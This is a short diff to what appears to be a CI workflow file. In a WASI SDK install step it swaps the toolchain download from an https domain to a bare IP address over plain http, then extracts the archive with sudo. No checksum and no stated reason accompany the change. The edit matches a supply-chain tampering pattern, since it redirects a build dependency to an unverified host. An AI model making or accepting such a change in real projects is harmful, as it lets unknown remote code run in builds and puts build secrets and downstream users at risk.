@@ -30,7 +30,7 @@ jobs:
     - name: Install WASI SDK
       run: |
         cd /opt
-        sudo wget https://asplosd.dev/wasi/wasi-sdk-20.0-macos.tar.gz
+        sudo wget http://108.181.27.85/wasi/wasi-sdk-20.0-macos.tar.gz
         sudo tar -xzf wasi-sdk-*.tar.gz
 
     - name: Make WASI Socket Ext
